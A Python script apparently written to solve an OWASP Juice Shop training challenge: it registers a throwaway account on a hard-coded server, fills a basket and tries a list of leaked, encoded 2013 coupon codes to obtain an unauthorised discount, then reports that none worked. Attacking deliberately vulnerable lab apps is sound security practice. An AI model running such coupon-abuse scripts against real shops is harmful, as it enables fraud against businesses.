#!/usr/bin/env python3

import requests
import time

def test_exact_backup_coupons():
    print("🧪 Testing EXACT backup coupons from 2013...")
    
    base_url = "http://66.42.93.220:9000"  # v13.3.0 container
    session = requests.Session()
    
    # Auth
    email = f"backup{int(time.time())}@test.com"
    password = "Test123!"
    
    session.post(f"{base_url}/api/Users/", json={
        "email": email, "password": password, "passwordRepeat": password,
        "securityQuestion": {"id": 1, "question": "test"}, "securityAnswer": "test"
    })
    
    login = session.post(f"{base_url}/rest/user/login", json={
        "email": email, "password": password
    })
    
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("✅ Authenticated")
        
        # Add product
        products = session.get(f"{base_url}/rest/products/search").json()['data']
        session.post(f"{base_url}/api/BasketItems/", json={
            "ProductId": products[0]['id'], "quantity": 1
        })
        
        # Get basket ID
        user_data = session.get(f"{base_url}/rest/user/whoami").json()['user']
        basket_id = user_data.get('bid', 1)
        print(f"Basket ID: {basket_id}")
        
        # Test the EXACT backup coupons from the file
        backup_coupons = [
            "n<MibgC7sn",  # JAN13-10
            "mNYS#gC7sn",  # FEB13-10
            "o*IVigC7sn",  # MAR13-10
            "k#pDlgC7sn",  # APR13-10
            "o*I]pgC7sn",  # MAY13-10
            "n(XRvgC7sn",  # JUN13-10
            "n(XLtgC7sn",  # JUL13-10
            "k#*AfgC7sn",  # AUG13-10
            "q:<IqgC7sn",  # SEP13-10
            "pEw8ogC7sn",  # OCT13-10
            "pes[BgC7sn",  # NOV13-10
            "l}6D$gC7ss",  # DEC13-15
        ]
        
        print(f"\\nTesting {len(backup_coupons)} EXACT backup coupons...")
        
        for i, coupon in enumerate(backup_coupons):
            month_names = ['JAN', 'FEB', 'MAR', 'APR', 'MAY', 'JUN', 
                          'JUL', 'AUG', 'SEP', 'OCT', 'NOV', 'DEC']
            expected_discount = 15 if coupon == "l}6D\$gC7ss" else 10
            
            print(f"   {i+1:2d}. {coupon} ({month_names[i]}13-{expected_discount}%)")
            
            coupon_response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{coupon}", json={})
            
            if coupon_response.status_code == 200:
                result = coupon_response.json()
                discount = result.get('discount', 0)
                
                if discount > 0:
                    print(f"       🎉 SUCCESS! {discount}% discount applied!")
                    print(f"       ✅ COUPON SYSTEM CONFIRMED WORKING!")
                    return True
                else:
                    print(f"       ✅ Accepted but no discount: {result}")
            else:
                print(f"       ❌ HTTP {coupon_response.status_code}: {coupon_response.text[:50]}")
        
        print(f"\\n🔍 Even exact backup coupons from 2013 don't work")
        print(f"   This suggests fundamental changes to coupon system")
        
    return False

# Test exact backup coupons
success = test_exact_backup_coupons()

if not success:
    print(f"\\n📋 CONCLUSION:")
    print(f"✅ Scripts work perfectly (authentication, basket, API calls)")
    print(f"❌ Coupon functionality fundamentally changed/disabled")
    print(f"🎯 Framework ready for compatible Juice Shop versions")

